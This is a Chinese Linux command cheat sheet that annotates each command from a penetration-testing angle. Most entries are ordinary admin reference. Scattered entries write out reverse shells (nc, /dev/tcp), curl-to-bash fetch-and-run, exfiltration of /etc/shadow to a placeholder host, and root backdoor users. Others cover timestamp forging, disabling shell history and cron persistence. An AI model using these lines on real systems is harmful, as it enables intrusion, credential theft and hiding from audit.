---
title: "Linux命令速查"
published: 2026-05-20
updated: 2026-05-20
draft: false
description: "ls -la           所有文件(含隐藏)+详细权限(rws=SUID, rwt=Sticky)"
image: ""
tags:
  - Linux基础
category: Linux运维
pinned: false
comment: true
author: Ziddzide
---

<!-- AI: Linux命令速查 | 80+命令按文件/进程/网络/权限/系统/文本分类 | 渗透视角+知识锚点+常用参数全覆盖 | 关键词: Linux命令, 渗透命令, 文件操作, 网络, 进程, 权限, shell -->

# Linux 命令速查（渗透视角增强版）

> **阅读方式**：每条命令按 "用途 → 常用参数 → 渗透视角 → 知识锚点" 组织。`#` 标注为渗透高频命令。

---

## 一、文件操作

### `ls` — 列出目录内容
```bash
ls -la          # 所有文件(含隐藏)+详细权限(rws=SUID, rwt=Sticky)
ls -lrt         # 倒序排列，最新文件在最后
ls -lh          # 人类可读的文件大小(K/M/G)
ls -i           # 显示inode号
ls -R           # 递归列出子目录
```
> **知识锚点**：`-l` 显示的 `rws`(SUID)、`rwt`(Sticky) 正是你学过的特殊权限位。

---

### `cd` — 切换目录
```bash
cd /etc         # 绝对路径
cd ..           # 上级目录
cd -            # 回到上一个所在目录
cd ~            # 家目录
```
> **知识锚点**：目录必须有 `x` 权限才能 `cd` 进去，缺少 `x` 将 Permission Denied。

---

### `pwd` — 显示当前路径
```bash
pwd             # /home/alice
pwd -P          # 显示物理路径（解析符号链接）
```
> **渗透视角** `#`：拿到shell后第一步通常是 `pwd`，确认自己落在哪个目录。

---

### `cat` — 查看文件内容
```bash
cat /etc/passwd
cat -n file     # 带行号输出
cat file1 file2 > merged   # 合并文件
```
> **知识锚点**：`cat /etc/shadow` 只有root可读，这正是 `/etc` 目录结构知识点的实战。

---

### `less` / `more` — 分页查看大文件
```bash
less /var/log/auth.log      # 上下翻页: f/b, 搜索: /keyword, 退出: q
more /var/log/syslog        # 老式分页，只支持向下
```
> **渗透视角** `#`：查看日志不刷屏，可翻页、搜索关键词。

---

### `head` / `tail` — 查看文件头尾
```bash
head -n 20 file     # 前20行
tail -f auth.log    # 实时跟踪日志(必用)
tail -n 50 file     # 最后50行
tail -f -n 0 file   # 从尾部开始实时监控
```
> **渗透视角** `#`：`tail -f` 监控日志，确认自己的操作是否被记录。

---

### `grep` — 文本搜索
```bash
grep "Failed password" /var/log/auth.log
grep -r "password" /etc/                    # 递归搜索目录
grep -v "#" file                            # 排除注释行
grep -i "error" file                        # 忽略大小写
grep -E "(error|fail|deny)" file            # 正则表达式(egrep)
grep -A 3 -B 2 "keyword" file              # 关键词前后N行
```
> **渗透视角** `#`：从海量日志和配置文件中快速挖掘敏感信息。

---

### `find` — 文件搜索
```bash
find / -name "*.conf" 2>/dev/null           # 按名称找
find / -perm -4000 -type f 2>/dev/null      # 找SUID文件
find / -perm -2000 -type f 2>/dev/null      # 找SGID文件
find / -writable -type f 2>/dev/null        # 找全局可写文件
find / -mtime -1 -type f 2>/dev/null        # 最近1天修改的文件
find / -size +100M -type f 2>/dev/null      # 大于100M的文件
find . -exec ls -la {} \;                   # 对结果执行命令
```
> **知识锚点**：`-perm -4000`=SUID提权检测，`-perm -2000`=SGID检测，`-perm -1000`=Sticky检测。

---

### `which` / `whereis` — 定位命令
```bash
which python     # 显示命令完整路径
whereis nc       # 路径+man手册页位置
type ls          # 判断是别名/内置/外部命令
```
> **渗透视角**：确认目标环境中安装了哪些可利用工具。

---

### `file` — 判断文件类型
```bash
file unknown.bin           # ELF 64-bit / ASCII text / PE32
file /bin/ls               # 查看可执行文件架构
```
> **渗透视角**：拿到无扩展名文件，先判断类型再决定如何处理，避免盲目执行。

---

### `stat` — 查看文件详细属性
```bash
stat /etc/shadow            # 显示inode/权限数字/SUID/SGID/Sticky/修改时间
stat -c "%a %n" file        # 只输出权限数字
```
> **知识锚点**：显示的权限数字（如0644）直接对应SUID(4)/SGID(2)/Sticky(1)。

---

### `touch` — 创建空文件或更新时间戳
```bash
touch hidden                # 创建空文件
touch -t 202401010101 file  # 伪造修改时间
touch -r ref.txt target.txt # 复制参考文件的时间戳
```
> **渗透视角**：创建`.hidden`隐藏文件，或伪造文件时间戳混淆入侵痕迹。

---

### `mkdir` / `rmdir` — 创建/删除目录
```bash
mkdir -p /tmp/a/b/c         # 递归创建多级目录
mkdir -m 700 private        # 创建时指定权限
rmdir emptydir              # 只能删空目录
rm -rf dir                  # 递归强制删（危险）
```

---

### `cp` / `mv` / `rm` — 复制/移动/删除
```bash
cp file1 file2              # 复制
cp -r dir1 dir2             # 递归复制目录
cp -p file1 file2           # 保留权限和时间戳
mv old new                  # 重命名/移动
rm file                     # 删除文件
rm -rf dir                  # 递归强制删除（无可挽回）
```

---

### `ln` — 创建链接
```bash
ln -s /etc/passwd link      # 符号链接(软链接)
ln /etc/passwd hardlink     # 硬链接(同一个inode)
```
> **渗透视角**：符号链接可用于TOCTOU竞态攻击，或劫持程序加载路径。

---

## 二、文本处理

### `echo` — 输出文本
```bash
echo "hello"                # 普通输出
echo -e "a\nb"              # 解析转义字符（换行）
echo "user::0:0:::/bin/bash" >> /etc/passwd   # 高危：追加后门用户
```
> **渗透视角** `#`：追加后门用户到passwd，或写入一句话木马到Web目录。

---

### `awk` — 列处理
```bash
awk -F: '{print $1}' /etc/passwd         # 打印用户名
awk -F: '$3==0 {print $1}' /etc/passwd   # UID=0的用户
awk -F: '($2=="") {print $1}' /etc/shadow # 空密码用户
```
> **渗透视角** `#`：一行命令提取UID=0或空密码的用户。

---

### `sed` — 流编辑器
```bash
sed 's/old/new/g' file          # 全局替换
sed -i 's/PasswordAuth yes/no/' /etc/ssh/sshd_config  # 原地修改
sed -n '5,10p' file             # 打印第5-10行
```

---

### `cut` / `sort` / `uniq` — 文本工具链
```bash
cut -d: -f1 /etc/passwd             # 提取冒号分隔的第一列
sort file | uniq -c                  # 排序+统计重复次数
sort -t: -k3 -n /etc/passwd         # 按UID数字排序
```

---

### `wc` — 字数统计
```bash
wc -l file      # 行数
wc -c file      # 字节数
ps aux | wc -l  # 进程数量
```

---

## 三、压缩与归档

### `tar` — 打包解包
```bash
tar -czvf archive.tar.gz /target     # 创建gzip压缩包
tar -xzvf archive.tar.gz             # 解压
tar -xf archive.tar                  # 解压(自动识别格式)
tar -czvf - /etc | nc IP 4444       # 打包后直接网络传输
```
> **渗透视角** `#`：压缩后传输敏感文件，减少流量暴露。

### `gzip` / `gunzip` — 单文件压缩
```bash
gzip file           # 压缩 → file.gz
gunzip file.gz      # 解压
```

---

## 四、进程管理

### `ps` — 查看进程快照
```bash
ps aux              # 所有用户+所有进程+详细信息
ps -ef              # SysV风格
ps auxf             # 进程树关系
ps aux --sort=-%mem # 按内存使用降序
```
> **渗透视角** `#`：看哪些服务在跑、谁是root启动的、有无杀软（clamav/defender）。

---

### `top` / `htop` — 动态进程监控
```bash
top -c              # 显示完整命令行
top -u root         # 只看root进程
# htop 内: F6排序 F9杀进程 F5树状视图
```
> **渗透视角**：CPU飙升的进程可能就是挖矿木马。

---

### `pgrep` / `pkill` — 按名称找/杀进程
```bash
pgrep -u root       # root用户的所有进程PID
pkill -f "nc "      # 按完整命令行杀
```

---

### `kill` — 终止进程
```bash
kill PID            # 优雅终止(SIGTERM, 15)
kill -9 PID         # 强制杀死(SIGKILL, 9)
kill -19 PID        # 暂停进程(SIGSTOP)
```
> **渗透视角**：终止安全软件进程，或清理自己的痕迹。

---

### `jobs` / `bg` / `fg` — 任务前后台切换
```bash
Ctrl+Z              # 暂停当前前台任务
bg                  # 把暂停的任务放后台继续
fg                  # 调回前台
jobs -l             # 查看后台任务及PID
```
> **渗透视角**：反弹shell里把耗时任务 `bg` 丢后台，避免shell挂了任务中断。

---

### `nohup` / `tmux` / `screen` — 会话保持
```bash
nohup ./long_script.sh &
tmux new -s mysession         # 创建session
tmux attach -t mysession      # 重新连接
screen -S name                # 创建session
screen -r name                # 重新连接
```
> **渗透视角** `#`：反弹shell环境不稳定，必须用tmux/nohup，否则命令执行到一半shell断了一切白费。

---

### `lsof` — 列出进程打开的文件
```bash
lsof -i :22             # 谁在用22端口
lsof -p 1234            # PID=1234打开的所有文件
lsof -c nginx           # nginx打开的文件
lsof +D /var/log        # 谁在访问/var/log下的文件
```
> **渗透视角** `#`：快速确定端口对应的服务进程。

---

### `strace` — 跟踪系统调用
```bash
strace -p PID           # 跟踪运行的进程
strace -f command       # 跟踪并跟踪子进程
strace -e open,read,write command  # 只跟踪文件操作
```
> **渗透视角**：分析可疑进程的行为——打开了什么文件、连了什么网络。

---

## 五、网络操作

### `ip` / `ifconfig` — 网络配置
```bash
ip a                    # 所有网卡信息(现代版)
ip route                # 路由表
ifconfig -a             # 传统命令
```
> **渗透视角** `#`：拿到shell后确认IP、网段、是否多网卡（可能通向内网）。

---

### `ping` — 连通性测试
```bash
ping -c 4 target        # 发4个包
ping -i 0.2 target      # 快速发包(每0.2秒)
```
> **渗透视角**：判断目标出网策略，ICMP是否被禁（禁了则改用TCP/HTTP）。

---

### `ss` / `netstat` — 网络连接
```bash
ss -tlnp                # 所有TCP监听端口+进程名(现代推荐)
ss -tunap               # TCP+UDP 全部连接+进程
netstat -tlnp           # 传统命令
netstat -ano            # 所有连接+PID
```
> **渗透视角** `#`：必看命令——本机开了什么服务、已有连接、是否已有人捷足先登。

---

### `curl` / `wget` — 文件传输
```bash
curl -O http://IP/file          # 下载，保留原文件名
curl -s http://IP/payload.sh | bash   # 静默下载+执行(危险)
wget http://IP/nc -O /tmp/nc    # 下载到指定路径
curl -F "file=@/etc/shadow" http://IP/upload  # 上传文件
```
> **渗透视角** `#`：从攻击机下拉提权脚本，或回传窃取的文件。

---

### `nc` / `ncat` — 网络瑞士军刀
```bash
# 监听
nc -lvp 4444

# 反弹shell
nc IP 4444 -e /bin/bash
bash -i >& /dev/tcp/IP/4444 0>&1

# 端口扫描
nc -zv target 20-100

# 文件传输
nc -lvp 4444 > received.file   # 接收方
nc IP 4444 < send.file         # 发送方
```
> **渗透视角** `#`：反弹shell、端口扫描、文件传输、隧道，一口命令全干。

---

### `ssh` — 安全远程连接
```bash
ssh user@host -p 2222               # 指定端口
ssh -i ~/.ssh/id_ed25519 user@host  # 用私钥认证
ssh -D 1080 user@host               # SOCKS代理隧道
ssh -L 8080:localhost:80 user@host  # 本地端口转发
ssh -R 8080:localhost:80 user@host  # 远程端口转发
```
> **知识锚点**：这正是你深入学过的SSH协议——密钥交换、子系统、加密通道。

---

### `scp` / `rsync` — 远程文件传输
```bash
scp file user@host:/tmp/            # 上传
scp user@host:/etc/passwd ./        # 下载
rsync -avz /src/ user@host:/dst/    # 同步目录(增量)
```
> **知识锚点**：`scp` 与 `SFTP` 同为SSH子系统，传输全加密。

---

### `dig` / `nslookup` / `host` — DNS查询
```bash
dig target.com ANY              # 所有DNS记录
dig target.com MX               # 邮件交换记录
dig -x 8.8.8.8                  # PTR反向解析
nslookup target.com             # 简易DNS查询
host -t NS target.com           # 查NS记录
```
> **渗透视角** `#`：信息收集第一步，DNS查询不产生扫描流量。

---

### `tcpdump` — 命令行抓包
```bash
tcpdump -i eth0 port 80                     # HTTP流量
tcpdump -i eth0 host 192.168.1.100          # 特定IP
tcpdump -i eth0 -w capture.pcap             # 存为文件
tcpdump -i eth0 -A "tcp port 21"            # FTP明文密码
```
> **渗透视角** `#`：内网嗅探明文密码，等同于你问过的"局域网窃听"。

---

### `iptables` — 防火墙规则
```bash
iptables -L -n -v               # 查看当前规则
iptables -A INPUT -p tcp --dport 4444 -j ACCEPT  # 开放端口
iptables -I INPUT -s IP -j DROP # 封禁IP
iptables-save > rules.v4        # 保存规则
```
> **渗透视角**：查看目标防火墙规则，甚至自己加规则维持后门访问。

---

## 六、权限与用户管理

### `whoami` / `id` — 当前身份
```bash
whoami              # 简单输出用户名
id                  # UID+GID+所有所属组
id alice            # 查询alice的组
```
> **渗透视角** `#`：拿到shell第一步——确认我是谁、我在哪些组。

---

### `chmod` — 修改权限
```bash
chmod 755 file              # rwxr-xr-x
chmod u+s file              # 设置SUID(等同于4775)
chmod g+s dir               # 设置SGID
chmod +t dir                # 设置Sticky Bit
chmod 4777 file             # SUID+所有人全权限
```
> **知识锚点** `#`：`chmod 4777`=SUID，`chmod 2777`=SGID，`chmod 1777`=Sticky——三大隐藏权限的实战命令。

---

### `chown` / `chgrp` — 修改所有者/组
```bash
chown root:root file        # 改所有者为root:root
chown -R alice:alice dir/   # 递归修改
chgrp docker file           # 只改组
```

---

### `useradd` / `userdel` / `usermod` — 用户管理
```bash
useradd alice
useradd -ou 0 -g 0 backdoor        # 创建UID=0的root级后门用户
userdel -r alice                    # 删用户+家目录
usermod -aG sudo alice              # 加入sudo组
```
> **渗透视角** `#`：`useradd -ou 0 -g 0 backdoor` 创建root级后门。

---

### `passwd` — 修改密码
```bash
passwd                  # 改自己密码
passwd alice            # (root)改alice的密码
passwd -l alice         # 锁定账户
passwd -u alice         # 解锁
```
> **知识锚点**：`/usr/bin/passwd` 本身带SUID，是你SUID章节的经典案例。

---

### `su` / `sudo` — 切换/提权
```bash
su                       # 切到root(需root密码)
su - alice               # 切到alice
sudo command             # 单次提权执行
sudo -i                  # root交互式shell(推荐)
sudo -l                  # 查看当前用户可sudo哪些命令
```
> **知识锚点**：`sudo -i` 优于 `sudo su` 因为审计不中断，详见su与sudo专题。

---

### `groups` / `w` / `who` — 用户监控
```bash
groups alice            # alice的所有组
w                       # 当前登录用户+他们在做什么
who                     # 谁登录了
last -20                # 最近20条登录记录
lastlog                 # 所有用户最后登录时间
```
> **渗透视角**：`w` 看有没有其他管理员在线，选择安全时间窗口行动。

---

## 七、系统信息与包管理

### `uname` — 系统内核信息
```bash
uname -a                # 全部信息(内核+主机+架构)
uname -r                # 仅内核版本
```
> **渗透视角** `#`：确认内核版本 → 找本地提权漏洞（如DirtyCow需特定内核）。

---

### 系统版本
```bash
cat /etc/os-release     # 所有现代发行版通用
cat /etc/issue          # 登录提示信息
hostnamectl             # systemd系统
```
> **渗透视角**：精确判断发行版（Ubuntu/CentOS/Debian 各有不同的默认配置和漏洞）。

---

### `df` / `du` / `free` — 资源查看
```bash
df -h                   # 磁盘使用(人类可读)
du -sh /home/           # 目录总大小
free -m                 # 内存(以MB显示)
lscpu                   # CPU详细信息
```
> **渗透视角**：判断机器价值、能否存放大数据、能否跑挖矿木马。

---

### `apt` (Debian) / `yum` (RHEL) — 包管理
```bash
# Debian/Ubuntu
apt update && apt upgrade -y
apt install nmap netcat -y

# RHEL/CentOS/Fedora
yum install -y nc
dnf install -y nmap
```
> **渗透视角**：安装渗透工具，或降级系统库为有漏洞旧版本。

---

### `dpkg` / `rpm` — 包查询
```bash
dpkg -l | grep openssh          # 已安装包的版本
rpm -qa | grep kernel           # 内核包版本
rpm -q --changelog package      # 查看更新日志(含CVE修复)
```
> **渗透视角**：精确查询已安装软件版本 → 匹配CVE漏洞库 → 找已存在的可利用漏洞。

---

### `systemctl` — 服务管理
```bash
systemctl status nginx
systemctl start/stop/restart nginx
systemctl enable/disable nginx
systemctl list-units --type=service  # 所有服务
```

---

### `crontab` — 定时任务
```bash
crontab -l              # 当前用户的计划任务
crontab -e              # 编辑
crontab -u alice -l     # (root)查看alice的cron
```
> **渗透视角** `#`：别人的cron可能暴露密码路径；把自己的后门写进cron维持持久化。

---

### `history` — 命令历史
```bash
history
history 50              # 最近50条
cat ~/.bash_history     # 历史文件
# HISTFILE=/dev/null    # 禁止记录(攻击者常用)
```
> **渗透视角** `#`：看管理员操作习惯、明文密码、判断服务器用途。

---

## 八、Shell操作与环境

### `alias` / `unalias` — 别名
```bash
alias ll='ls -la'
alias                   # 查看所有别名
\ls                     # 反斜杠绕过别名执行原生命令
```
> **渗透视角**：`\command` 绕过管理员设置的别名陷阱。

---

### `export` / `env` / `set` — 环境变量
```bash
export HISTSIZE=0       # 不记录历史
env                     # 显示所有环境变量
echo $PATH              # 可执行文件搜索路径
set                     # 显示所有Shell变量(含函数)
```
> **渗透视角** `#`：`env` 看环境，`export HISTSIZE=0` 关历史记录。

---

### `source` / `.` — 执行脚本在当前Shell
```bash
source ~/.bashrc        # 重新加载配置文件
. script.sh             # 同source
```

---

### `dd` — 数据复制
```bash
dd if=/dev/zero of=test bs=1M count=100    # 创建100M空文件
dd if=/dev/sda of=disk.img bs=4M           # 全盘镜像
dd if=/dev/urandom of=file bs=1M count=10  # 创建随机数据文件
```

---

### `chroot` — 切换根目录
```bash
chroot /newroot /bin/bash   # 将/newroot当作新的/
```
> **渗透视角**：部分安全配置不当允许逃逸chroot环境。

---

### 管道与重定向

| 符号 | 用途 | 示例 |
|------|------|------|
| `\|` | 管道：左输出→右输入 | `ps aux \| grep root` |
| `>` | 覆盖写入 | `echo aa > file` |
| `>>` | 追加写入 | `echo bb >> file` |
| `<` | 从文件读取输入 | `cat < file` |
| `2>/dev/null` | 丢弃错误信息 | `find / -perm -4000 2>/dev/null` |
| `&>` | 标准输出+错误合并 | `command &> log` |

---

## 关联知识

- [[Linux-特殊权限]]
- [[Linux-安全加固]]
- [[Linux-su与sudo]]
- [[../00_速查/速查-OSI与TCPIP模型]]
- [[../00_速查/速查-全协议逐条讲解]]
